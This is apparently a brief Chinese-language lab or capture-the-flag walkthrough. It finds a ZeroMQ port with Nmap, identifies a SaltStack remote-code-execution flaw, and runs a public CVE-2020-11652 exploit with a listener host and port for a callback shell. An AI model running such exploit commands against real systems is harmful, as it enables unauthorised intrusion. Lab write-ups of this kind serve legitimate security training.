# Nmap

![image](https://hackmd.io/_uploads/BkF99G68a.png)

- 發現有開自定義port，看一下ZerMQ

![image](https://hackmd.io/_uploads/HJhQiG6Ua.png)

- 發現saltstack的RCE


- 嘗試用searchsploit找相關的exploit

![image](https://hackmd.io/_uploads/HJL7wnT8T.png)

- 嘗試後不行，改找開源的github

![image](https://hackmd.io/_uploads/Bk_p3368a.png)

- Download exploit
    - `pip install salt`
    - `python3 CVE-2020-11652.py --master $target --port 4506 -lh 192.168.45.161 -lp 80 --exec-choose master`

![image](https://hackmd.io/_uploads/SyYPpnaU6.png)

![image](https://hackmd.io/_uploads/Hyeqah6Ia.png)




